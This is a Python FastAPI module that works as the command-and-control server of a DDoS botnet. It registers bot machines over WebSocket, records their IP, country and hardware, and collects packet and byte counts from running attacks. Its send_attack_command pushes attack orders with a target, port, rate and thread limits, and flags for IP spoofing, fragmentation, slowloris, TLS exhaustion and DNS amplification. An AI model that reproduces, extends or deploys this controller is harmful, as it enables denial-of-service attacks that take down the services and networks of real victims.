import json
from datetime import datetime, timezone
from typing import Dict
from uuid import UUID
from fastapi import WebSocket, WebSocketDisconnect
from app.services.bot_service import BotService
from app.database import async_session
from app.models.all_models import Bot, AttackTask, AttackLog
from sqlalchemy import select

class BotConnectionManager:
    def __init__(self): self.active: Dict[str, WebSocket] = {}
    async def connect(self, ws: WebSocket, bot_id: str):
        await ws.accept(); self.active[bot_id] = ws
        await BotService.set_status(UUID(bot_id), "online")
    async def disconnect(self, bot_id: str):
        self.active.pop(bot_id, None)
        try: await BotService.set_status(UUID(bot_id), "offline")
        except: pass
    async def send_json(self, bot_id: str, data: dict):
        ws = self.active.get(bot_id)
        if ws:
            try: await ws.send_json(data)
            except: await self.disconnect(bot_id)
    async def send_attack_command(self, bot_id: str, task: dict):
        await self.send_json(bot_id, {
            "type": "attack", "task_id": task["id"], "target": task["target"],
            "port": task["port"], "method": task["method"], "duration": task["duration"],
            "max_pps": task.get("pps", 100000), "max_threads": task.get("threads", 100),
            "spoof_mode": task.get("spoof_mode", 0), "fragmentation": task.get("fragmentation", 0),
            "slowloris": task.get("slowloris", 0), "tls_exhaust": task.get("tls_exhaust", 0),
            "dns_amp": task.get("dns_amp", 0), "game_mimic": task.get("game_mimic", 0),
            "mega_mode": task.get("mega_mode", 0),
        })
    async def send_stop_command(self, bot_id: str, task_id: str):
        await self.send_json(bot_id, {"type": "stop", "task_id": task_id})

manager = BotConnectionManager()

async def handle_bot_websocket(ws: WebSocket, bot_id: str):
    await manager.connect(ws, bot_id)
    try:
        while True:
            raw = await ws.receive_text(); data = json.loads(raw); msg_type = data.get("type", "")
            if msg_type == "handshake":
                identifier = data.get("bot_identifier", "")
                async with async_session() as s:
                    bot = (await s.execute(select(Bot).where(Bot.bot_identifier == identifier))).scalar_one_or_none()
                    if not bot:
                        nb = Bot(id=UUID(bot_id), bot_identifier=identifier, ip_address=data.get("ip_address"), country=data.get("country"), os_name=data.get("os_name","Linux"), os_version=data.get("os_version"), cpu_cores=data.get("cpu_cores"), ram_total_mb=data.get("ram_total_mb"), net_speed_mbps=data.get("net_speed_mbps"), status="online", first_seen_at=datetime.now(timezone.utc))
                        s.add(nb); await s.commit()
                    else:
                        bot.ip_address = data.get("ip_address", bot.ip_address); bot.status = "online"; bot.last_heartbeat_at = datetime.now(timezone.utc); await s.commit()
                await ws.send_json({"type": "handshake_ack", "bot_id": bot_id})
            elif msg_type == "heartbeat":
                await BotService.update_heartbeat(UUID(bot_id), data)
            elif msg_type == "attack_stats":
                task_id = data.get("task_id")
                if task_id:
                    async with async_session() as s:
                        s.add(AttackLog(task_id=UUID(task_id), bot_id=UUID(bot_id), packets_sent=data.get("packets_sent",0), bytes_sent=data.get("bytes_sent",0)))
                        task = (await s.execute(select(AttackTask).where(AttackTask.id == UUID(task_id)))).scalar_one_or_none()
                        if task:
                            task.total_packets = (task.total_packets or 0) + data.get("packets_sent", 0)
                            task.total_bytes = (task.total_bytes or 0) + data.get("bytes_sent", 0)
                        await s.commit()
    except WebSocketDisconnect: await manager.disconnect(bot_id)
    except Exception: await manager.disconnect(bot_id)